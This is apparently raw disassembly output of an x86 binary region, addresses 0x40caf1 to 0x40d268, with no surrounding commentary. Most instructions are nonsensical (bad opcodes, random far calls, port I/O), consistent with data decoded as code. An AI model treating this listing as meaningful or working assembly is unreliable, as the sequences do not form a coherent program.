  40caf1:	pop    eax
  40caf2:	xor    bl,BYTE PTR [edi+eiz*1-0x34]
  40caf6:	sub    DWORD PTR [esi],edx
  40caf8:	out    dx,eax
  40caf9:	or     BYTE PTR [edi+ebx*1+0x5fe94cba],0xc1
  40cb01:	aaa    
  40cb02:	pop    ss
  40cb03:	stc    
  40cb04:	or     BYTE PTR [ecx],cl
  40cb06:	adc    esp,DWORD PTR [edi+0x2eb7ae43]
  40cb0c:	ins    DWORD PTR es:[edi],dx
  40cb0d:	cmp    eax,0x1dc6227f
  40cb12:	mov    ecx,0x9b4ab144
  40cb17:	out    0x74,al
  40cb19:	adc    BYTE PTR cs:[esi+0x1a3235cc],bl
  40cb20:	ds ins DWORD PTR es:[edi],dx
  40cb22:	pop    es
  40cb23:	inc    esi
  40cb24:	imul   DWORD PTR [ecx-0x48747a65]
  40cb2a:	sub    DWORD PTR [eax+0x33],ebx
  40cb2d:	pop    ecx
  40cb2e:	call   FWORD PTR ds:0xa60c45a0
  40cb34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb35:	retf   
  40cb36:	adc    al,0x12
  40cb39:	push   ecx
  40cb3a:	inc    edi
  40cb3b:	mov    dh,0xc
  40cb3d:	enter  0xb9b,0xae
  40cb41:	or     al,0xda
  40cb43:	in     al,0x81
  40cb45:	mov    eax,ds:0xb172dc56
  40cb4a:	data16 xlat BYTE PTR ds:[ebx]
  40cb4c:	sub    eax,0xe3060deb
  40cb51:	(bad)  
  40cb53:	(bad)  
  40cb54:	mov    edx,0xb490eb4f
  40cb59:	lods   al,BYTE PTR ds:[esi]
  40cb5a:	shl    DWORD PTR [edx+esi*1-0x444a5fad],1
  40cb61:	mov    ds:0xe081d8d6,eax
  40cb66:	jo     0x40cb17
  40cb68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb69:	iret   
  40cb6a:	sub    eax,0x94dbc069
  40cb6f:	inc    esi
  40cb70:	or     eax,0x5a86dd5b
  40cb75:	jo     0x40cb56
  40cb77:	pop    ebx
  40cb78:	aam    0x5b
  40cb7a:	push   0xffffffe4
  40cb7c:	jne    0x40cbc1
  40cb7e:	push   es
  40cb7f:	push   ebx
  40cb80:	mov    esp,DWORD PTR [ebx+0x1fbc2fb5]
  40cb86:	mov    ah,bh
  40cb88:	jle    0x40cb58
  40cb8a:	adc    DWORD PTR [ebp+0x7f18de7c],esi
  40cb90:	(bad)  
  40cb91:	imul   ebx,DWORD PTR [esi],0x9365718b
  40cb97:	in     al,dx
  40cb98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb99:	ja     0x40cb75
  40cb9b:	(bad)  
  40cb9c:	inc    eax
  40cb9d:	mov    eax,0x6269d796
  40cba2:	cs mov edx,0x6d382e40
  40cba8:	push   es
  40cba9:	mov    cs,eax
  40cbab:	xchg   ebx,eax
  40cbac:	shl    DWORD PTR [ebp-0x3a],0x62
  40cbb0:	movlps QWORD PTR [edi+ebx*4-0x2445369],xmm1
  40cbb8:	mov    edx,0x69129ee7
  40cbbd:	or     esi,ecx
  40cbbf:	mov    ah,0xae
  40cbc1:	outs   dx,DWORD PTR ds:[esi]
  40cbc2:	popa   
  40cbc3:	outs   dx,DWORD PTR ds:[esi]
  40cbc4:	jg     0x40cbaf
  40cbc6:	mov    dh,0xa0
  40cbc8:	push   ecx
  40cbc9:	fist   WORD PTR [eax+0x7c]
  40cbcc:	and    DWORD PTR ds:0x246ac537,esp
  40cbd2:	fistp  WORD PTR [esp+edi*8]
  40cbd5:	stc    
  40cbd6:	sbb    DWORD PTR [esi+0x766ea250],edi
  40cbdc:	dec    eax
  40cbdd:	(bad)  
  40cbde:	lock in eax,0xc3
  40cbe1:	inc    edi
  40cbe2:	xchg   BYTE PTR [eax-0x30e332e1],cl
  40cbe8:	aad    0x8a
  40cbea:	xchg   ebp,eax
  40cbeb:	mov    cl,0x5e
  40cbed:	xchg   DWORD PTR [edi-0x58],edi
  40cbf0:	jle    0x40cc6f
  40cbf2:	out    0x55,eax
  40cbf4:	push   eax
  40cbf5:	xor    BYTE PTR [esi],dl
  40cbf7:	shr    DWORD PTR [ecx],0x56
  40cbfa:	pop    eax
  40cbfb:	(bad)  
  40cbfc:	jmp    0x40cc4e
  40cbfe:	xchg   ebp,eax
  40cbff:	mov    ds:0xfd7860de,al
  40cc04:	das    
  40cc05:	add    ebx,DWORD PTR [ebx-0x6]
  40cc08:	fistp  WORD PTR [ebx+eiz*2]
  40cc0b:	jecxz  0x40cbb8
  40cc0d:	sbb    eax,0xf1b14d9c
  40cc12:	or     al,0x29
  40cc14:	add    al,0x6
  40cc16:	xchg   esi,eax
  40cc17:	xor    al,0x3a
  40cc19:	out    dx,eax
  40cc1a:	mov    esi,0x236f36af
  40cc1f:	sub    edx,DWORD PTR [esi-0x26]
  40cc22:	xchg   DWORD PTR [eax],edx
  40cc24:	add    BYTE PTR [edx+0x62fd5552],dl
  40cc2a:	or     ebp,esp
  40cc2c:	repz mov al,0xe0
  40cc2f:	das    
  40cc30:	popf   
  40cc31:	enter  0xa2da,0xb0
  40cc35:	cmp    eax,edx
  40cc37:	mov    WORD PTR [edi-0x143da2cc],fs
  40cc3d:	pop    edx
  40cc3e:	add    eax,0x75403d6c
  40cc43:	scas   al,BYTE PTR es:[edi]
  40cc44:	inc    eax
  40cc45:	cmp    BYTE PTR [ebp+0x475aa696],dh
  40cc4b:	jecxz  0x40ccb3
  40cc4d:	in     al,0x2a
  40cc4f:	or     BYTE PTR [edx-0x6b],ah
  40cc52:	aaa    
  40cc53:	push   edi
  40cc54:	call   0xd1de6d94
  40cc59:	rcr    ah,cl
  40cc5b:	xor    al,0x9d
  40cc5d:	mov    DWORD PTR ds:0xedd7683d,edi
  40cc63:	xchg   ebx,eax
  40cc64:	hlt    
  40cc65:	mov    esp,0x60781dda
  40cc6a:	(bad)  
  40cc6b:	mov    eax,0x46c6f35b
  40cc70:	test   al,0x50
  40cc72:	push   ss
  40cc73:	cmp    ch,cl
  40cc75:	jmp    0xe3074bf3
  40cc7a:	push   eax
  40cc7b:	or     dl,bh
  40cc7d:	pop    ss
  40cc7e:	es cli 
  40cc80:	xchg   edx,eax
  40cc81:	mov    WORD PTR [esi],?
  40cc83:	inc    ebx
  40cc84:	adc    ebx,DWORD PTR [ecx]
  40cc86:	mov    eax,ds:0x189f5baa
  40cc8b:	mov    dl,0x9a
  40cc8d:	in     eax,0x33
  40cc8f:	and    eax,0xc3ace0c5
  40cc94:	(bad)  
  40cc95:	hlt    
  40cc96:	leave  
  40cc97:	jns    0x40cd17
  40cc99:	mov    ds:0x9131699d,eax
  40cc9e:	icebp  
  40cc9f:	inc    ebp
  40cca0:	cdq    
  40cca1:	xchg   ebx,eax
  40cca2:	imul   ebx,ecx,0xd74c5101
  40cca8:	stc    
  40cca9:	mov    edx,0xa8fc1d01
  40ccae:	mov    esp,0x1389fa04
  40ccb3:	test   DWORD PTR [eax-0x26],esp
  40ccb6:	push   eax
  40ccb7:	clc    
  40ccb8:	xor    DWORD PTR [ecx+eax*8+0x19],esp
  40ccbc:	dec    esi
  40ccbd:	leave  
  40ccbe:	and    BYTE PTR [edi-0x16],bl
  40ccc1:	sbb    bh,BYTE PTR [edx-0x5fcb5e82]
  40ccc7:	mov    ds:0x8e579e2c,al
  40cccc:	mov    ah,0x69
  40ccce:	and    cl,bh
  40ccd0:	mov    ecx,0xc8d82769
  40ccd5:	sbb    BYTE PTR [edx],cl
  40ccd7:	test   eax,0xacb033e9
  40ccdc:	pop    ds
  40ccdd:	xlat   BYTE PTR ds:[ebx]
  40ccde:	ja     0x40ccec
  40cce0:	jle    0x40cc76
  40cce2:	inc    ebp
  40cce3:	jg     0x40cce4
  40cce5:	sub    eax,0xd7f94e57
  40ccea:	xor    ebx,0x202c58a0
  40ccf0:	fdivr  DWORD PTR [ecx+0x6f5cba9f]
  40ccf6:	ds cs pusha 
  40ccf9:	outs   dx,BYTE PTR ds:[esi]
  40ccfa:	add    edx,ebx
  40ccfc:	mov    esi,0x6c47451e
  40cd01:	aas    
  40cd02:	mov    DWORD PTR ds:0x3aefcc20,esp
  40cd08:	cmp    al,BYTE PTR [ebp-0x8]
  40cd0b:	clc    
  40cd0c:	hlt    
  40cd0d:	or     edx,DWORD PTR [esi+0x113e9270]
  40cd13:	pop    ds
  40cd14:	cdq    
  40cd15:	cmp    BYTE PTR [eax+0x62b818fc],ah
  40cd1b:	ret    
  40cd1c:	add    al,0x18
  40cd1e:	test   al,0xc5
  40cd20:	ds scas al,BYTE PTR es:[edi]
  40cd22:	pushf  
  40cd23:	jns    0x40cd80
  40cd25:	mov    edx,0x52515557
  40cd2a:	jl     0x40cd94
  40cd2c:	mov    bh,0x95
  40cd2e:	outs   dx,DWORD PTR ds:[esi]
  40cd2f:	push   esi
  40cd30:	mov    ebx,0xd7290fdb
  40cd35:	jle    0x40cd63
  40cd37:	pop    ss
  40cd38:	inc    esp
  40cd39:	push   0x5b0e8b6c
  40cd3e:	xor    al,0xc0
  40cd40:	mov    bl,0xc3
  40cd42:	dec    ebp
  40cd43:	xchg   esp,eax
  40cd44:	jmp    0x8c4b:0x8eb0c734
  40cd4b:	pop    ecx
  40cd4c:	sar    DWORD PTR [ebp-0x7c7a0e1e],0x8d
  40cd53:	lahf   
  40cd54:	cli    
  40cd55:	fmul   st(6),st
  40cd57:	lods   al,BYTE PTR ds:[esi]
  40cd58:	fs jg  0x40cdca
  40cd5b:	in     al,dx
  40cd5c:	push   es
  40cd5d:	add    BYTE PTR [edi+0x2dd3c039],0x90
  40cd64:	mov    cl,0xac
  40cd66:	fs jl  0x40cdd3
  40cd69:	push   ebx
  40cd6a:	les    ebp,FWORD PTR [esi]
  40cd6c:	pusha  
  40cd6d:	retf   0xb674
  40cd70:	inc    edi
  40cd71:	(bad)  
  40cd73:	cli    
  40cd74:	xor    eax,0x13d20ef4
  40cd79:	mov    BYTE PTR [ecx],0x40
  40cd7c:	jb     0x40cde6
  40cd7e:	leave  
  40cd7f:	jne    0x40cd0b
  40cd81:	mov    eax,0x2ea9aa96
  40cd86:	jmp    0x40cdd8
  40cd88:	sbb    eax,DWORD PTR es:[ebx]
  40cd8b:	jae    0x40cd8b
  40cd8d:	fwait
  40cd8e:	push   edi
  40cd8f:	or     eax,0xb74a5136
  40cd94:	aaa    
  40cd95:	ja     0x40cd8b
  40cd97:	(bad)  [ebp+0x26407b3f]
  40cd9d:	pop    eax
  40cd9e:	pushf  
  40cd9f:	jne    0x40cd8e
  40cda1:	cs (bad) 
  40cda3:	setae  al
  40cda6:	je     0x40cdfe
  40cda8:	mov    eax,0xc0d20ea3
  40cdad:	or     eax,0x620cb205
  40cdb2:	ss pop eax
  40cdb4:	and    DWORD PTR [esi],ebp
  40cdb6:	push   es
  40cdb7:	in     al,dx
  40cdb8:	cmp    al,0x73
  40cdba:	push   ebx
  40cdbb:	push   ss
  40cdbc:	cs mov esp,edx
  40cdbf:	jb     0x40cd80
  40cdc1:	shl    BYTE PTR cs:[eax+ebp*2-0x1a],0xbd
  40cdc7:	cmc    
  40cdc8:	rcr    DWORD PTR [ebx+edi*2-0x5],0x56
  40cdcd:	lds    ebp,FWORD PTR [edi-0x1e]
  40cdd0:	cmp    bl,0x32
  40cdd3:	and    DWORD PTR [edx+esi*2-0x3d],ebp
  40cdd7:	xlat   BYTE PTR ds:[ebx]
  40cdd8:	das    
  40cdd9:	mov    esp,0x53e57da4
  40cdde:	xchg   DWORD PTR [esi],ecx
  40cde0:	jge    0x40ce0b
  40cde2:	stos   DWORD PTR es:[edi],eax
  40cde3:	mov    ds:0xc1eb8949,al
  40cde8:	pop    esi
  40cde9:	adc    edi,DWORD PTR [edx-0x56346cf7]
  40cdef:	out    dx,eax
  40cdf0:	into   
  40cdf1:	adc    esp,esp
  40cdf3:	xchg   esi,eax
  40cdf4:	pop    eax
  40cdf5:	sub    BYTE PTR [esp+ebx*2-0x7e],dl
  40cdf9:	bound  ebx,QWORD PTR [esi+0x33aad1e8]
  40cdff:	mov    dh,0xb4
  40ce01:	cmp    edi,esp
  40ce03:	xacquire xchg DWORD PTR [ebp+0x340f04de],esp
  40ce0a:	add    esp,DWORD PTR [esi]
  40ce0c:	cli    
  40ce0d:	and    eax,0x92358e14
  40ce12:	xor    al,0xef
  40ce14:	cmp    BYTE PTR [esi],0xa8
  40ce17:	and    al,0x49
  40ce19:	je     0x40ce76
  40ce1b:	xor    edi,DWORD PTR [edx+0x2c]
  40ce1e:	in     eax,dx
  40ce1f:	cmp    eax,0x99549b3f
  40ce24:	cwde   
  40ce25:	ins    BYTE PTR es:[edi],dx
  40ce26:	sbb    esp,eax
  40ce28:	pop    ebx
  40ce29:	adc    BYTE PTR [esi+0x5],ah
  40ce2c:	xchg   edi,eax
  40ce2d:	rol    ebp,0x3b
  40ce30:	xor    DWORD PTR [ebp+0x4b],ebp
  40ce33:	gs xchg ebx,eax
  40ce35:	mov    dl,0x7f
  40ce37:	pop    eax
  40ce38:	pop    ebx
  40ce39:	mov    ebx,gs
  40ce3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce3c:	xor    DWORD PTR [esi+edi*1-0x6a],ebx
  40ce40:	not    ebp
  40ce42:	pop    ecx
  40ce43:	pop    ecx
  40ce44:	je     0x40ce03
  40ce46:	sbb    ah,BYTE PTR [ebp+0x40ef3f7f]
  40ce4c:	test   BYTE PTR ds:[eax+0x3a],dl
  40ce50:	les    eax,FWORD PTR [eax]
  40ce52:	adc    al,0x84
  40ce54:	test   al,0xf1
  40ce56:	call   0x20a2a75c
  40ce5b:	jecxz  0x40ce51
  40ce5d:	sahf   
  40ce5e:	in     al,dx
  40ce5f:	jno    0x40cebd
  40ce61:	mov    bl,BYTE PTR [edi]
  40ce63:	jmp    0x40ce4b
  40ce65:	and    DWORD PTR [esp+edi*4-0x76],0x53
  40ce6a:	lea    ebx,[eax]
  40ce6c:	inc    eax
  40ce6d:	inc    edx
  40ce6e:	sbb    eax,0xa56c1c4b
  40ce73:	sbb    ecx,DWORD PTR [edx+0x7028537d]
  40ce79:	scas   eax,DWORD PTR es:[edi]
  40ce7a:	push   esp
  40ce7b:	sbb    ebp,ecx
  40ce7d:	mov    ch,0xe1
  40ce7f:	mov    ebx,0x951647b6
  40ce84:	hlt    
  40ce85:	xor    al,BYTE PTR [eax-0x318a0801]
  40ce8b:	mov    WORD PTR [esi],es
  40ce8d:	add    BYTE PTR [esi],cl
  40ce8f:	jle    0x40ce7e
  40ce91:	out    0xfe,al
  40ce93:	mov    al,ds:0x76b5d7f6
  40ce98:	(bad)  
  40ce99:	daa    
  40ce9a:	lods   eax,DWORD PTR ds:[esi]
  40ce9b:	les    edx,FWORD PTR [ebx-0x9]
  40ce9e:	ss stc 
  40cea0:	pop    edx
  40cea1:	push   edx
  40cea2:	int3   
  40cea3:	(bad)  
  40cea5:	pop    ds
  40cea6:	pop    ss
  40cea7:	sbb    BYTE PTR [esi],dh
  40cea9:	leave  
  40ceaa:	aaa    
  40ceab:	in     al,0xf2
  40cead:	mov    ?,WORD PTR [ebp-0x15]
  40ceb0:	inc    ebp
  40ceb1:	adc    dh,0x97
  40ceb4:	jns    0x40cf32
  40ceb6:	int    0x92
  40ceb8:	and    al,0xe7
  40ceba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cebb:	fisttp QWORD PTR [edx]
  40cebd:	cmp    al,0x17
  40cebf:	lods   al,BYTE PTR ds:[esi]
  40cec0:	inc    eax
  40cec1:	mov    ds:0xdd8c2b31,al
  40cec7:	ins    BYTE PTR es:[edi],dx
  40cec8:	mov    WORD PTR [ebp+0x5e],es
  40cecb:	mov    al,0xc3
  40cecd:	pop    esi
  40cece:	sti    
  40cecf:	mov    esi,ecx
  40ced1:	and    eax,0x62bdc0b1
  40ced6:	lds    ebp,FWORD PTR [ebx+0x41969a40]
  40cedc:	mov    ds:0xb1d4072,eax
  40cee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cee2:	mov    eax,ds:0x4db85bf7
  40cee7:	in     eax,dx
  40cee8:	add    ebp,edx
  40ceea:	push   ecx
  40ceeb:	dec    ecx
  40ceec:	dec    eax
  40ceed:	pop    edx
  40ceee:	sub    ah,dh
  40cef0:	shl    BYTE PTR [eax+0x5d],cl
  40cef3:	std    
  40cef4:	test   al,0xb1
  40cef6:	or     BYTE PTR [ecx-0x356dac7e],0xd7
  40cefd:	or     BYTE PTR [esi],0x2f
  40cf00:	mov    BYTE PTR [ebx-0x4a],al
  40cf03:	push   ss
  40cf04:	jne    0x40cf28
  40cf06:	pop    ecx
  40cf07:	scas   eax,DWORD PTR es:[edi]
  40cf08:	pushf  
  40cf09:	mov    bl,0xdc
  40cf0b:	out    0x6f,al
  40cf0d:	addr16 ss push eax
  40cf10:	ret    0xb7e2
  40cf13:	inc    edi
  40cf14:	ret    
  40cf15:	mov    esp,0x7cde2a3e
  40cf1a:	arpl   WORD PTR ds:0xa5fa19e6,bx
  40cf20:	repz and DWORD PTR [esi-0x4ad59754],edx
  40cf27:	jae    0x40cf06
  40cf29:	mov    al,ds:0xb68962bf
  40cf2e:	cmp    al,0xee
  40cf30:	ror    DWORD PTR [ecx-0x7e81e849],cl
  40cf36:	leave  
  40cf37:	inc    eax
  40cf38:	pop    ss
  40cf39:	jnp    0x40cf2b
  40cf3b:	jnp    0x40cf4e
  40cf3d:	js     0x40cf49
  40cf3f:	sti    
  40cf40:	or     eax,0x7c5c7d29
  40cf45:	xor    ebx,ecx
  40cf47:	(bad)  
  40cf48:	clc    
  40cf49:	adc    al,0x64
  40cf4b:	repz imul edx,DWORD PTR [ecx],0x5
  40cf4f:	sbb    al,0x6c
  40cf51:	inc    eax
  40cf52:	add    eax,0x501b905d
  40cf57:	mov    edi,0xf384b0b5
  40cf5c:	pop    ebx
  40cf5d:	cmove  eax,DWORD PTR ds:0xe96bc04b
  40cf64:	sub    DWORD PTR [ecx+0x4e],esp
  40cf67:	aad    0xd3
  40cf69:	bswap  ecx
  40cf6b:	mov    eax,DWORD PTR [ebp-0x34]
  40cf6e:	mov    ecx,DWORD PTR [ebp-0x8]
  40cf71:	mov    DWORD PTR [ecx+0xc],eax
  40cf74:	mov    eax,DWORD PTR [ebp-0x30]
  40cf77:	jmp    0x40d482
  40cf7c:	iret   
  40cf7d:	(bad)  
  40cf7e:	enter  0xd5cb,0xc9
  40cf82:	fcmovnu st,st(2)
  40cf84:	rol    DWORD PTR [edx],1
  40cf86:	ficom  WORD PTR [ebx]
  40cf88:	test   al,0xec
  40cf8a:	out    0xf7,al
  40cf8c:	loop   0x40cf40
  40cf8e:	js     0x40d008
  40cf90:	push   0x7c
  40cf92:	js     0x40d00c
  40cf94:	push   cs
  40cf95:	sti    
  40cf96:	mov    bh,0x9c
  40cf98:	xchg   ebp,eax
  40cf99:	call   0x64d2:0x6d64a882
  40cfa0:	gs (bad) 
  40cfa3:	push   esp
  40cfa4:	test   al,0x70
  40cfa6:	stos   BYTE PTR es:[edi],al
  40cfa7:	cmp    edx,edi
  40cfa9:	cmp    al,0xf4
  40cfab:	lock dec ebp
  40cfad:	shr    BYTE PTR [ebx+0x7a0e5216],0x62
  40cfb4:	and    eax,0x6ee26c14
  40cfb9:	inc    ebx
  40cfba:	push   ecx
  40cfbb:	mov    WORD PTR [ebp-0x665d2eb7],ss
  40cfc1:	fsubr  st(6),st
  40cfc3:	gs add ch,cl
  40cfc6:	cmp    esi,esi
  40cfc8:	(bad)  
  40cfc9:	dec    ebx
  40cfca:	dec    ecx
  40cfcb:	fcmove st,st(3)
  40cfcd:	dec    eax
  40cfce:	cdq    
  40cfcf:	jp     0x40d001
  40cfd1:	fs and esp,esp
  40cfd4:	loop   0x40d015
  40cfd6:	out    dx,al
  40cfd7:	scas   eax,DWORD PTR es:[edi]
  40cfd8:	test   DWORD PTR [esp+ebx*4-0x4a7328fb],ebx
  40cfdf:	mov    edi,0x68e55707
  40cfe4:	out    0xeb,al
  40cfe6:	cli    
  40cfe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfe8:	xor    DWORD PTR [ecx+0x3964e121],ecx
  40cfee:	nop
  40cfef:	ret    0xda0b
  40cff2:	mov    esp,0x6c67b2ce
  40cff7:	push   ds
  40cff8:	dec    ebx
  40cff9:	sti    
  40cffa:	push   0x5bc231d5
  40cfff:	test   al,0x33
  40d001:	ret    0xca84
  40d004:	inc    edx
  40d005:	inc    esi
  40d006:	aam    0xf4
  40d008:	push   ds
  40d009:	mov    edi,0x3aed6faf
  40d00e:	dec    esp
  40d00f:	sbb    al,0x26
  40d011:	xor    DWORD PTR [ebp+0x24403254],ecx
  40d017:	cmp    edi,ebp
  40d019:	sub    DWORD PTR [eax+0x26],esi
  40d01c:	jl     0x40d06c
  40d01e:	or     DWORD PTR [esi],ebx
  40d020:	inc    ebp
  40d021:	in     al,0xdb
  40d023:	mov    ds:0x5d8da4c3,eax
  40d028:	pop    edx
  40d029:	xor    eax,0x1d66ae87
  40d02e:	ja     0x40d09c
  40d030:	shl    DWORD PTR [edx],1
  40d032:	cld    
  40d033:	mov    eax,ds:0x94ccbff3
  40d038:	push   cs
  40d039:	dec    cx
  40d03b:	fdiv   QWORD PTR [ecx-0x4d]
  40d03e:	push   edi
  40d03f:	adc    esi,DWORD PTR [ebx+0x7d9b30e7]
  40d045:	cs mov ah,0xbb
  40d048:	out    dx,al
  40d049:	sbb    DWORD PTR ds:0xc8632b37,eax
  40d04f:	sub    al,0xf4
  40d051:	inc    eax
  40d052:	pop    es
  40d053:	test   BYTE PTR [edi-0x44e86330],bl
  40d059:	add    eax,DWORD PTR [ecx+0x21]
  40d05c:	(bad)  
  40d05d:	mov    BYTE PTR [edx-0x9],ch
  40d060:	pop    ebx
  40d061:	ds retf 
  40d063:	mov    bh,0x2f
  40d065:	push   edx
  40d066:	mov    ds:0xe9c7c74b,eax
  40d06b:	pop    ecx
  40d06c:	out    0x78,eax
  40d06e:	and    BYTE PTR [ebp+0x73],ah
  40d071:	pop    ss
  40d072:	adc    esi,ecx
  40d074:	arpl   WORD PTR [eax],bx
  40d076:	outs   dx,BYTE PTR ds:[esi]
  40d077:	call   0xc305:0x80639094
  40d07e:	pop    esi
  40d07f:	or     DWORD PTR [esp+esi*1+0x18],eax
  40d083:	cmp    DWORD PTR [ebx-0x31],ecx
  40d086:	jp     0x40d080
  40d088:	(bad)  
  40d089:	jns    0x8bea674
  40d08f:	and    ebx,DWORD PTR [edi]
  40d091:	(bad)  
  40d092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d093:	jg     0x40d106
  40d095:	and    ch,BYTE PTR [edx+0x2073fce9]
  40d09b:	sar    BYTE PTR [esi],0x10
  40d09e:	imul   ebp,DWORD PTR [esi],0xffffff86
  40d0a1:	out    0x8c,al
  40d0a3:	clc    
  40d0a4:	cmp    eax,0xfa415da4
  40d0a9:	inc    ebp
  40d0aa:	xchg   edi,eax
  40d0ab:	(bad)  
  40d0ac:	cli    
  40d0ad:	xchg   ebx,eax
  40d0ae:	clc    
  40d0af:	(bad)  
  40d0b0:	stc    
  40d0b1:	mov    cl,0xda
  40d0b3:	add    DWORD PTR [esi],esp
  40d0b5:	cmp    edx,ebp
  40d0b7:	push   edx
  40d0b8:	jl     0x40d06d
  40d0ba:	mov    ebx,0x3c716984
  40d0bf:	and    al,0xf0
  40d0c1:	(bad)  
  40d0c2:	enter  0x5c3e,0x58
  40d0c6:	call   0x9abe:0x6b2e8d1c
  40d0cd:	jae    0x40d0ad
  40d0cf:	scas   eax,DWORD PTR es:[edi]
  40d0d0:	repnz stc 
  40d0d2:	jmp    0x40d079
  40d0d4:	test   BYTE PTR [ecx-0xf],dl
  40d0d7:	mov    dh,0xe1
  40d0d9:	int3   
  40d0da:	fild   WORD PTR [eax+0x1e]
  40d0dd:	push   edi
  40d0de:	into   
  40d0df:	ja     0x40d0f5
  40d0e1:	or     eax,0x9c1566b
  40d0e6:	xor    BYTE PTR [edx],bl
  40d0e8:	mov    bl,0x31
  40d0ea:	pop    esi
  40d0eb:	stc    
  40d0ec:	xchg   edx,eax
  40d0ed:	dec    esp
  40d0ee:	jecxz  0x40d165
  40d0f0:	retf   
  40d0f1:	inc    esi
  40d0f2:	cmp    DWORD PTR [ebp-0x6b2c6a49],esp
  40d0f8:	sbb    bh,al
  40d0fa:	pop    es
  40d0fb:	sar    BYTE PTR [esi],cl
  40d0fd:	lods   al,BYTE PTR ds:[esi]
  40d0fe:	das    
  40d0ff:	jmp    0x4e8b:0xadf51be1
  40d106:	jb     0x40d0a2
  40d108:	ret    0x5fbd
  40d10b:	loopne 0x40d0df
  40d10d:	into   
  40d10e:	xchg   ebx,eax
  40d10f:	jae    0x40d170
  40d111:	mov    ecx,0xe2b143e2
  40d116:	adc    al,0x6
  40d118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d119:	push   edi
  40d11a:	data16 cs sbb al,0xe7
  40d11e:	fisttp QWORD PTR [ebx]
  40d120:	jle    0x40d113
  40d122:	push   edx
  40d123:	jmp    0x40d15e
  40d125:	fisubr WORD PTR [ecx]
  40d127:	xchg   DWORD PTR [ebx+0x562f3e44],eax
  40d12d:	pusha  
  40d12e:	mov    ch,0x3e
  40d130:	loope  0x40d11e
  40d132:	push   0xf9f28c8
  40d137:	lods   eax,DWORD PTR ds:[esi]
  40d138:	neg    DWORD PTR [edi+0x2f]
  40d13b:	and    eax,ebx
  40d13d:	dec    esi
  40d13e:	jecxz  0x40d142
  40d140:	icebp  
  40d141:	push   ecx
  40d142:	pop    ebp
  40d143:	push   es
  40d144:	jge    0x40d134
  40d146:	lea    ebp,[ebx+eax*8]
  40d149:	ret    0x504b
  40d14c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d14d:	gs aaa 
  40d14f:	clc    
  40d150:	cdq    
  40d151:	mov    ebx,0x8484d340
  40d156:	mov    BYTE PTR [ebx+ebp*8-0x38548cf5],bl
  40d15d:	test   al,0xba
  40d15f:	in     eax,0xd5
  40d161:	xchg   esp,eax
  40d162:	xor    al,BYTE PTR [edi+0xd170645]
  40d168:	mov    ecx,0x8c473608
  40d16d:	mov    esi,0x1ec2fb0f
  40d172:	(bad)  
  40d173:	mov    ds:0x32967d5d,al
  40d178:	mov    ebx,0xebdbe6c7
  40d17d:	das    
  40d17e:	mov    ah,0x45
  40d180:	out    0x76,al
  40d182:	push   ss
  40d183:	out    dx,al
  40d184:	adc    ah,0xc5
  40d187:	xor    ecx,DWORD PTR [esi]
  40d189:	in     al,0x9b
  40d18b:	xchg   BYTE PTR [ecx+0x4c0055f3],ch
  40d191:	test   BYTE PTR [esi],bl
  40d193:	imul   ebx,DWORD PTR [ebx],0xabf995bd
  40d199:	mov    ds:0xe06e9951,al
  40d19e:	xor    DWORD PTR [esi],esi
  40d1a0:	pop    edi
  40d1a1:	call   0xae99dbc4
  40d1a6:	xchg   edx,eax
  40d1a7:	sar    DWORD PTR [edi-0x3d3f0f0],cl
  40d1ad:	fdivr  st(1),st
  40d1af:	mov    ah,BYTE PTR [ecx+0xd]
  40d1b2:	sub    ch,BYTE PTR [ebx]
  40d1b4:	cmp    al,0xc6
  40d1b6:	imul   eax,esi,0xffffffff
  40d1b9:	xor    eax,0x49e967fb
  40d1be:	pop    eax
  40d1bf:	mov    bh,0x4d
  40d1c1:	push   ecx
  40d1c2:	ret    0xa14f
  40d1c5:	ins    DWORD PTR es:[edi],dx
  40d1c6:	test   BYTE PTR [eax],bh
  40d1c8:	and    ah,BYTE PTR [edx+ebp*2-0x53]
  40d1cc:	dec    edi
  40d1cd:	pop    eax
  40d1cf:	fiadd  WORD PTR [ecx+edi*4]
  40d1d2:	call   0xa86721d5
  40d1d7:	dec    edx
  40d1d8:	fdiv   st(0),st
  40d1da:	sub    al,0x33
  40d1dc:	int    0x40
  40d1de:	repz mov esp,0x9925c19a
  40d1e4:	mov    ebp,edi
  40d1e6:	gs inc ebp
  40d1e8:	cmp    eax,0x53f79341
  40d1ed:	xor    ax,cx
  40d1f0:	cmp    al,0x23
  40d1f2:	pop    ebx
  40d1f3:	inc    esp
  40d1f4:	sbb    DWORD PTR [ebx+0x6f],0x35976b93
  40d1fb:	mov    edi,0xdafe50df
  40d200:	lea    eax,[eax-0x5f184934]
  40d206:	or     DWORD PTR [edx+0x25],ecx
  40d209:	pop    ss
  40d20a:	mov    ds:0x30c3ce4d,al
  40d20f:	fwait
  40d210:	adc    DWORD PTR [edx-0x3110139a],esi
  40d216:	or     esi,DWORD PTR [ebx-0x362768f5]
  40d21c:	lock rol ah,0xa0
  40d220:	mov    bl,0x90
  40d222:	test   al,0x45
  40d224:	cdq    
  40d225:	(bad)  
  40d226:	sbb    esi,ebx
  40d228:	stc    
  40d229:	xor    DWORD PTR [edi-0x4a],edx
  40d22c:	sub    BYTE PTR [edx],dh
  40d22e:	or     DWORD PTR [ecx+0x14c0116],edx
  40d234:	frstor [edx-0x32401cef]
  40d23a:	ror    DWORD PTR [eax],0xba
  40d23d:	and    eax,0x302be544
  40d242:	(bad)  
  40d243:	mov    cl,0x9a
  40d245:	cmp    dh,BYTE PTR [edi]
  40d247:	mov    bh,0x81
  40d249:	push   ecx
  40d24a:	popa   
  40d24b:	jl     0x40d27d
  40d24d:	rcl    DWORD PTR [esi-0x22636770],cl
  40d253:	xchg   edx,eax
  40d254:	cmp    DWORD PTR [edx+0x6e2b308f],esp
  40d25a:	jnp    0x40d28f
  40d25c:	mov    edx,0xd2ea37df
  40d261:	add    al,0x67
  40d263:	mov    dh,0xed
  40d265:	addr16 out dx,al
  40d267:	pop    edx
  40d268:	clc    
